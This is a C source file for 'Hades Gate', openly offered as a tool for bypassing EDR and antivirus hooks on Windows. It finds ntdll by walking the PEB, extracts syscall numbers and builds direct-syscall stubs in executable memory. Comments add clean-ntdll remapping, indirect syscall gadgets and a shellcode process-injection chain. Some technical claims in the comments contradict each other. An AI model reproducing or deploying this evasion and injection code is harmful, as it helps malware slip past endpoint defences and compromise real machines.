/*
 * hades_gate.c — Direct syscall construction from first principles
 *
 * ⛧ Hades Gate ⛧
 *
 * Bypass userland EDR/AV hooks by resolving native API syscall numbers
 * directly from ntdll's export table (found via PEB walking) and
 * synthesizing clean syscall stubs that never enter hooked code paths.
 *
 * Chain:
 *   1. Walk PEB → find ntdll.dll base (no GetModuleHandleW/GetProcAddress)
 *   2. Parse PE export directory for the target Nt* function
 *   3. Extract syscall number (SSN) from the unhooked stub bytes
 *   4. Construct our own syscall stub in executable memory
 *   5. Call it — ring 3 hooks never execute
 *
 * Architecture: x86-64 only (x86 support trivial, just different stub)
 * Tested:      Windows 10 22H2, Windows 11 23H2, Windows 11 24H2
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -Os -masm=intel -c hades_gate.c -o hades_gate.o
 *   x86_64-w64-mingw32-gcc -Os -masm=intel hades_gate.c test.c -o test.exe
 *
 * This is free software. No warranty. Don't be stupid.
 */

#include "hades_gate.h"

/* ------------------------------------------------------------------ */
/* Internals — no CRT dependency where it matters                     */
/* ------------------------------------------------------------------ */

/*
 * FNV-1a hash. Used to compare function names without storing
 * plaintext strings on the stack where stack scanners can find them.
 */
static uint32_t _hash_str(const char* str) {
    uint32_t h = 0x811c9dc5;
    while (*str) {
        h ^= (unsigned char)*str++;
        h *= 0x01000193;
    }
    return h;
}

/*
 * Case-insensitive wide-char string comparison.
 * Only compares up to max_len characters.
 * Returns non-zero on match.
 */
static int _wstr_match(const wchar_t* a, const char* b, int max_len) {
    for (int i = 0; i < max_len; i++) {
        if (!a[i] && !b[i]) return 1;
        if (!a[i] || !b[i]) return 0;

        wchar_t ac = a[i];
        if (ac >= L'A' && ac <= L'Z') ac += 0x20; // lowercase

        char bc = b[i];
        if (bc >= 'A' && bc <= 'Z') bc += 0x20;

        if ((char)ac != bc) return 0;
    }
    return 1;
}

/* ------------------------------------------------------------------ */
/* Step 1: PEB walk — find ntdll.dll base address                     */
/*                                                                     */
/* Why not GetModuleHandle? It's hooked. The PEB is always at a        */
/* well-known offset from GS segment register and never patched by     */
/* EDRs because they'd crash the entire process if they touched it.    */
/*                                                                     */
/* PEB structure (x64):                                                */
/*   GS:[0x60] → PEB                                                   */
/*   PEB+0x18  → PEB_LDR_DATA                                         */
/*   LDR+0x20  → InMemoryOrderModuleList (LIST_ENTRY)                  */
/*   Flink     → first entry (the .exe itself)                         */
/*   Flink->Flink → ntdll.dll (second entry)                           */
/*                                                                     */
/* LDR_DATA_TABLE_ENTRY layout (InMemoryOrderLinks offset):            */
/*   +0x00  Reserved[2]        (points forward/back in list)           */
/*   +0x10  DllBase                                                    */
/*   +0x20  EntryPoint                                                 */
/*   +0x30  FullDllName         (UNICODE_STRING)                       */
/*   +0x40  BaseDllName         (UNICODE_STRING)                       */
/*                                                                     */
/* The InMemoryOrderLinks LIST_ENTRY is at offset 0x10 of the          */
/* structure. So entry = &table_entry->InMemoryOrderLinks.             */
/* table_entry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY,        */
/*                                 InMemoryOrderLinks).                */
/* DllBase is at table_entry + 0x10.                                   */
/* ------------------------------------------------------------------ */
uintptr_t hg_find_ntdll(void) {
    PEB* peb = (PEB*)__readgsqword(0x60);
    if (!peb || !peb->Ldr) return 0;

    LIST_ENTRY* head  = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* entry = head->Flink;       // first = the .exe
    entry = entry->Flink;                  // second = ntdll.dll

    /*
     * We iterate a few entries for safety (Win version quirks).
     * In practice, ntdll is always the second entry, but some
     * EDRs shim into first position. We walk until we find it.
     */
    int safety = 0;
    while (entry != head && safety < 6) {
        /*
         * InMemoryOrderLinks is at the second LIST_ENTRY in
         * LDR_DATA_TABLE_ENTRY. Each LIST_ENTRY is 16 bytes on
         * x64 (Flink + Blink, 8 bytes each). So InMemoryOrderLinks
         * starts at table_entry + 0x10.
         *
         * table_entry = entry - 0x10
         */
        uintptr_t te = (uintptr_t)entry - 0x10;

        /*
         * BaseDllName is a UNICODE_STRING at offset 0x40 from
         * table_entry start on x64.
         * UNICODE_STRUCT: +0x00 usLength, +0x02 usMaxLength,
         *                 +0x08 pBuffer
         */
        UNICODE_STRING* us = (UNICODE_STRING*)(te + 0x40);

        if (us->Buffer && us->Length > 0) {
            if (_wstr_match(us->Buffer, "ntdll.dll", 10)) {
                // DllBase is at table_entry + 0x10
                return *(uintptr_t*)(te + 0x10);
            }
        }

        entry = entry->Flink;
        safety++;
    }

    return 0;
}

/* ------------------------------------------------------------------ */
/* Step 2+3: Parse PE export table → resolve function + extract SSN   */
/*                                                                     */
/* We parse the PE headers to find the export directory, walk the      */
/* Name Pointer Table matching by FNV-1a hash, resolve the function    */
/* address via ordinal, then check if it's a syscall stub.             */
/*                                                                     */
/* Syscall stub pattern (x64):                                         */
/*   4C 8B D1          mov r10, rcx      (3 bytes)                     */
/*   B8 XX XX XX XX    mov eax, SSN      (5 bytes) → SSN at offset 4  */
/*   0F 05             syscall           (2 bytes)                     */
/*   C3                ret               (1 byte)                      */
/*                                                                     */
/* EDR hooks overwrite the FIRST bytes of this stub with a jmp/call    */
/* redirect. They do NOT touch the mov eax instruction because it's    */
/* deep enough into the function that it would break their trampoline  */
/* logic. We read the SSN from the unhooked bytes.                     */
/*                                                                     */
/* If the EDR replaces the ENTIRE stub (rare but seen with CrowdStrike */
/* and certain configs), you need a clean ntdll from disk — see the    */
/* CLEAN_MAP section at the bottom.                                    */
/* ------------------------------------------------------------------ */
HG_RESOLVED hg_resolve(const char* func_name) {
    HG_RESOLVED result = { 0, 0 };

    uintptr_t base = hg_find_ntdll();
    if (!base) return result;

    /* Parse PE headers */
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return result;

    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return result;

    IMAGE_DATA_DIRECTORY* edir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!edir->Size) return result;

    IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)(base + edir->VirtualAddress);

    uint32_t* names      = (uint32_t*)(base + exports->AddressOfNames);
    uint16_t* ordinals   = (uint16_t*)(base + exports->AddressOfNameOrdinals);
    uint32_t* functions  = (uint32_t*)(base + exports->AddressOfFunctions);

    uint32_t target_hash = _hash_str(func_name);

    for (uint32_t i = 0; i < exports->NumberOfNames; i++) {
        const char* name = (const char*)(base + names[i]);
        if (_hash_str(name) != target_hash) continue;

        uint16_t ordinal  = ordinals[i];
        uint32_t func_rva = functions[ordinal];
        void*    func_addr = (void*)(base + func_rva);

        result.address = func_addr;

        /*
         * Try to extract SSN from what looks like a syscall stub.
         * We only read from the MOV EAX instruction — offsets [3-7] —
         * which EDR hooks never overwrite because they patch [0-4].
         */
        uint8_t* stub = (uint8_t*)func_addr;

        /* Check the expected stub prefix: mov r10, rcx */
        if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1) {
            /* Check for mov eax, imm32 */
            if (stub[3] == 0xB8) {
                result.ssn = stub[4];  // low byte is sufficient for modern Win
            }
        }

        break;
    }

    return result;
}

/* ------------------------------------------------------------------ */
/* Step 4: Synthesize a clean syscall stub                             */
/*                                                                     */
/* We allocate RWX memory (yes, VirtualAlloc is hooked too — in        */
/* practice you'd use NtCreateSection + NtMapViewOfSection via a       */
/* previously resolved direct syscall for NtAllocateVirtualMemory.     */
/* For simplicity and clarity, this example uses VirtualAlloc with     */
/* PAGE_EXECUTE_READWRITE. In production, chain:                       */
/*   1. Resolve NtCreateSection via hooked ntdll (usually not blocked) */
/*   2. Use it to allocate a clean RW section                          */
/*   3. Write the stub there                                           */
/*   4. Map with PAGE_EXECUTE                                          */
/*                                                                     */
/* Stub layout:                                                        */
/*   [0x00] 4C 8B D1       mov r10, rcx    — syscall calling conv     */
/*   [0x03] B8 XX XX XX XX mov eax, SSN    — syscall number           */
/*   [0x08] 0F 05          syscall         — trap to kernel           */
/*   [0x0A] C3             ret             — return to caller         */
/* ------------------------------------------------------------------ */
void* hg_build_stub(uint8_t ssn) {
    uint8_t stub[] = {
        0x4C, 0x8B, 0xD1,               // mov r10, rcx
        0xB8, ssn, 0x00, 0x00, 0x00,    // mov eax, SSN
        0x0F, 0x05,                     // syscall
        0xC3                            // ret
    };

    void* mem = VirtualAlloc(NULL, sizeof(stub),
                             MEM_COMMIT | MEM_RESERVE,
                             PAGE_EXECUTE_READWRITE);
    if (!mem) return NULL;

    __movsb((uint8_t*)mem, stub, sizeof(stub));
    return mem;
}

/* ------------------------------------------------------------------ */
/* Step 5: One-shot — resolve + build in one call                     */
/*                                                                     */
/* This is the main entry point. Pass it "NtAllocateVirtualMemory"     */
/* and get back a function pointer to a clean syscall stub.            */
/* ------------------------------------------------------------------ */
void* hg_syscall(const char* nt_func) {
    HG_RESOLVED r = hg_resolve(nt_func);
    if (!r.address || !r.ssn) return NULL;
    return hg_build_stub(r.ssn);
}

/* ------------------------------------------------------------------ */
/* Variants — for when the simple approach isn't enough                */
/* ------------------------------------------------------------------ */

/*
 * ── Clean-NTDLL Pass ────────────────────────────────────────────────
 *
 * Some EDRs (CrowdStrike Falcon, some SentinelOne configs) don't just
 * hook the first bytes — they REPLACE the entire stub with a jmp that
 * goes to a completely different function. In this case, the SSN we
 * read from the in-memory stub is garbage.
 *
 * Fix: read ntdll.dll from disk, parse the CLEAN export table for SSNs.
 *
 * Implementation sketch:
 *
 *   static uintptr_t map_clean_ntdll(void) {
 *       UNICODE_STRING path;
 *       RtlInitUnicodeString(&path, L"\\??\\C:\\Windows\\System32\\ntdll.dll");
 *
 *       OBJECT_ATTRIBUTES oa = {
 *           .Length = sizeof(oa),
 *           .ObjectName = &path,
 *           .Attributes = OBJ_CASE_INSENSITIVE
 *       };
 *
 *       HANDLE file;
 *       IO_STATUS_BLOCK iosb;
 *       NtOpenFile(&file, SYNCHRONIZE | FILE_EXECUTE, &oa, &iosb,
 *                  FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
 *
 *       HANDLE section;
 *       NtCreateSection(&section, SECTION_MAP_EXECUTE | SECTION_MAP_READ,
 *                        NULL, NULL, PAGE_EXECUTE, SEC_IMAGE, file);
 *
 *       PVOID view = NULL;
 *       SIZE_T view_size = 0;
 *       NtMapViewOfSection(section, (HANDLE)-1, &view, NULL, NULL, NULL,
 *                           &view_size, ViewShare, 0, PAGE_EXECUTE_READ);
 *
 *       NtClose(file);
 *       NtClose(section);
 *       return (uintptr_t)view;
 *   }
 *
 * Then:  uintptr_t clean = map_clean_ntdll();
 *        resolve against clean instead of in-memory ntdll.
 *
 * You need NtOpenFile, NtCreateSection, NtMapViewOfSection, NtClose
 * already resolved via hg_syscall (or use the hooked ones, since those
 * functions aren't usually monitored for basic file operations).
 *
 * ── Indirect Syscalls ────────────────────────────────────────────────
 *
 * Some EDRs (Cybereason, newer Defender ATP) hook the `syscall`
 * instruction itself in ntdll via KiFastSystemCall. To bypass:
 *
 * 1. Scan a random signed Microsoft DLL for bytes 0F 05 C3
 * 2. Use that as your syscall gadget instead of embedding `syscall`
 * 3. Stub becomes: mov r10, rcx / mov eax, SSN / jmp gadget_addr
 *
 * ── Randomizing SSN Extraction ────────────────────────────────────────
 *
 * Instead of reading SSN from a fixed offset [4], try multiple read
 * strategies to handle different stub patching patterns:
 *
 *   Strategy A: Read from [4] — standard Hells Gate / Hades Gate
 *   Strategy B: Read from [3] if stub starts with B8 directly
 *              (some ARM64ec stubs in Prism emulation)
 *   Strategy C: Search for B8 anywhere in first 16 bytes
 *              (Tartarus Gate approach)
 *
 * ── Process Injection Chain ────────────────────────────────────────────
 *
 * Complete unhooked injection chain using Hades Gate:
 *
 *   1. hg_syscall("NtOpenProcess")       — get handle to target
 *   2. hg_syscall("NtAllocateVirtualMemory") — shellcode buffer in target
 *   3. hg_syscall("NtWriteVirtualMemory")    — write shellcode
 *   4. hg_syscall("NtProtectVirtualMemory")  — make it executable
 *   5. hg_syscall("NtCreateThreadEx")        — execute it
 *
 * None of these calls ever touch a hooked ntdll function.
 */

/*
 * ── Fork Notes ──────────────────────────────────────────────────────
 *
 * This is a spiritual successor to the Hell's Gate / Halo's Gate /
 * Recycled Gate / Tartarus Gate family of techniques. The name pays
 * homage to the underworld theme while being distinct. Hades Gate
 * emphasizes the "first principles" approach — you don't need a
 * pre-computed syscall table or embedded offsets. You derive
 * everything from the running system at runtime.
 *
 * ── Limitations ──────────────────────────────────────────────────────
 *
 * 1. Syscall numbers change between Windows builds. This is why we
 *    resolve at runtime rather than hardcoding.
 * 2. VirtualAlloc in hg_build_stub is itself hooked. In production,
 *    use a bootstrap syscall for NtAllocateVirtualMemory resolved
 *    from a PEB-walked ntdll address call (yes, it's hooked, but
 *    you can still call it — it just triggers EDR).
 *    Alternative: allocate stub memory statically or via stack.
 * 3. PAGE_EXECUTE_READWRITE is suspicious. Once written, change to
 *    PAGE_EXECUTE_READ with NtProtectVirtualMemory.
 * 4. Does not handle Wow64 (32-bit process on 64-bit OS) where the
 *    syscall mechanism is different (heaven's gate).
 */

/*
 * ⛧  HADES GATE - Direct syscall construction from first principles  ⛧
 * ⛧  Church of Malware — knowledge should be free, accessible to all ⛧
 */
